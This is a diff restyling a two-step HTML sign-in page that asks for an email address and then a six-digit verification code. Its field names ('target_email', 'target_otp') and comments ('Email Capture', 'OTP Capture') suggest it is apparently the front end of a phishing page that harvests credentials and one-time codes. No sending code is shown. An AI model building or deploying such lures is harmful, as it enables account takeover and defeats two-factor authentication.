@@ -3,124 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Log In</title>
+    <title>Secure Session Verification</title>
     <style>
-        /* Base Reset & Typography */
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        * {
+            box-sizing: border-box;
             margin: 0;
-            color: #1c1e21;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f8fafc;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        /* Clean Card UI */
-        .login-container {
+        .login-card {
             background: #ffffff;
+            width: 100%;
+            max-width: 400px;
             padding: 40px 32px;
             border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
-            width: 100%;
-            max-width: 420px;
-            box-sizing: border-box;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05), 0 4px 10px rgba(0, 0, 0, 0.03);
             text-align: center;
         }
 
+        .logo-placeholder {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #10b981, #06b6d4);
+            border-radius: 12px;
+            margin: 0 auto 24px auto;
+        }
+
         h2 {
-            margin-top: 0;
-            margin-bottom: 28px;
+            font-size: 1.5rem;
+            color: #0f172a;
+            margin-bottom: 8px;
             font-weight: 600;
-            font-size: 24px;
         }
 
-        p.subtitle {
-            color: #606770;
-            font-size: 14.5px;
-            margin-bottom: 24px;
-            line-height: 1.5;
+        p {
+            font-size: 0.95rem;
+            color: #64748b;
+            margin-bottom: 28px;
         }
 
-        /* Input Fields */
         .input-group {
             margin-bottom: 20px;
             text-align: left;
         }
 
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #4b4f56;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
         .input-group input {
             width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #ccd0d5;
+            padding: 12px 16px;
+            font-size: 1rem;
+            border: 1px solid #cbd5e1;
             border-radius: 8px;
-            font-size: 16px;
-            box-sizing: border-box;
+            outline: none;
             transition: border-color 0.2s, box-shadow 0.2s;
         }
 
         .input-group input:focus {
-            border-color: #1877f2;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
+            border-color: #06b6d4;
+            box-shadow: 0 0 0 3px rgba(6, 182, 212, 0.15);
         }
 
-        /* Action Buttons */
         .submit-btn {
             width: 100%;
-            padding: 14px;
-            background-color: #1877f2;
-            color: white;
+            background: #0f172a;
+            color: #ffffff;
             border: none;
+            padding: 14px;
+            font-size: 1rem;
+            font-weight: 500;
             border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s;
-            margin-top: 8px;
+            transition: background 0.2s;
         }
 
         .submit-btn:hover {
-            background-color: #166fe5;
+            background: #1e293b;
+        }
+        
+        .submit-btn:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
         }
 
-        /* Hide OTP section on initial load */
-        #otp_section {
-            display: none;
-        }
+        /* Step visibility controlled by the Master JS */
+        #step_email { display: block; }
+        #step_otp { display: none; }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h2>Secure Log In</h2>
 
-        <!-- Phase 1: Email Capture -->
-        <div id="email_section">
-            <p class="subtitle">Enter your email address to continue.</p>
+    <div class="login-card">
+        <div class="logo-placeholder"></div>
+        
+        <!-- STEP 1: EMAIL -->
+        <div id="step_email">
+            <h2>Sign In</h2>
+            <p>Please verify your email address to continue securely.</p>
+            
             <div class="input-group">
-                <label for="target_email">Email Address</label>
-                <input type="email" id="target_email" placeholder="name@example.com" autocomplete="off" required>
+                <input type="email" id="target_email" placeholder="Email Address" required autocomplete="off">
             </div>
-            <button type="button" id="submit_email_btn" class="submit-btn">Next</button>
+            
+            <button id="submit_email_btn" class="submit-btn">Next</button>
         </div>
 
-        <!-- Phase 2: OTP Capture -->
-        <div id="otp_section">
-            <p class="subtitle">Please enter the 6-digit verification code sent to your email.</p>
+        <!-- STEP 2: OTP -->
+        <div id="step_otp">
+            <h2>Verification Required</h2>
+            <p>Enter the security code we just sent to your email.</p>
+            
             <div class="input-group">
-                <label for="target_otp">Verification Code</label>
-                <input type="text" id="target_otp" placeholder="000000" autocomplete="off" maxlength="6" required>
+                <input type="text" id="target_otp" placeholder="6-Digit OTP" required autocomplete="off" maxlength="6">
             </div>
-            <button type="button" id="submit_otp_btn" class="submit-btn">Verify & Sign In</button>
+            
+            <button id="submit_otp_btn" class="submit-btn">Verify & Continue</button>
         </div>
     </div>
+
 </body>
 </html>
